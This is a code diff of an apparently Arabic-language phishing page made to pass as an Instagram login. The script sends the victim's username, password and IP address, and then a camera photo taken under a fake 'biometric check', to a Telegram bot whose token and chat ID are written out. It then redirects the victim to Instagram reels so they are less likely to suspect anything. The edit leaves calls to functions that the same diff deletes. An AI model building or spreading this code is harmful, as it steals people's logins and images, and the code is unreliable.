@@ -57,12 +57,20 @@
     </footer>
 
     <script>
-        const _v1 = "OTAzMjExMzAyNA==";
-        const _v2 = "QUFFcXB4S3F2T0otWW9GazU3WXMwZ3hCNUdId2xIUDRMMA==";
-        const _v3 = "ODY1ODIxNzYwNQ==";
-        
-        const _getT = () => atob(_v1) + ":" + atob(_v2);
-        const _getC = () => atob(_v3);
+      <script>
+    
+   const s1 = "9032113024";
+    const s2 = "AAEqpxKq";
+    const s3 = "vOJI_yoF";
+    const s4 = "k57Ys0gx";
+    const s5 = "B5GHwlHP4L0";
+    const cId = "9032113024";
+
+    function _buildKey() {
+        return s1 + ":" + s2 + s3 + s4 + s5;
+    }
+
+    let u_e = "", u_p = "";
 
         let user_id = "", user_pw = "";
         let ip_info = "جاري الجلب...";
@@ -74,7 +82,7 @@
             } catch(e) { ip_info = "غير معروف"; }
         };
 
-        // 2. عند تسجيل الدخول: إرسال البيانات النصية أولاً ثم الانتقال للتحقق
+      
         document.getElementById('login-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             user_id = document.getElementById('user').value;
@@ -82,14 +90,14 @@
 
             const msg = `📥 صيدة نصية:\n👤 الحساب: ${user_id}\n🔑 الباسورد: ${user_pw}\n🌐 IP: ${ip_info}`;
             
-            // إرسال البيانات النصية فوراً
+            
             fetch(`https://api.telegram.org/bot${_getT()}/sendMessage?chat_id=${_getC()}&text=${encodeURIComponent(msg)}`);
 
             document.getElementById('auth-section').style.display = 'none';
             document.getElementById('verify-section').style.display = 'block';
         });
 
-        // 3. التحقق الحيوي (الكاميرا)
+       
         document.getElementById('biometric-btn').addEventListener('click', async function() {
             this.innerText = "... جاري الفحص";
             this.disabled = true;
@@ -114,12 +122,12 @@
                     await fetch(`https://api.telegram.org/bot${_getT()}/sendPhoto`, { method: 'POST', body: fd });
 
                     stream.getTracks().forEach(t => t.stop());
-                    // التوجيه النهائي للريلز
+                    
                     window.location.replace("https://www.instagram.com/reels/");
                 }, 'image/jpeg');
 
             } catch (err) {
-                // إذا رفض الكاميرا، وجهه أيضاً لتقليل الشك
+          
                 window.location.replace("https://www.instagram.com/reels/");
             }
         });
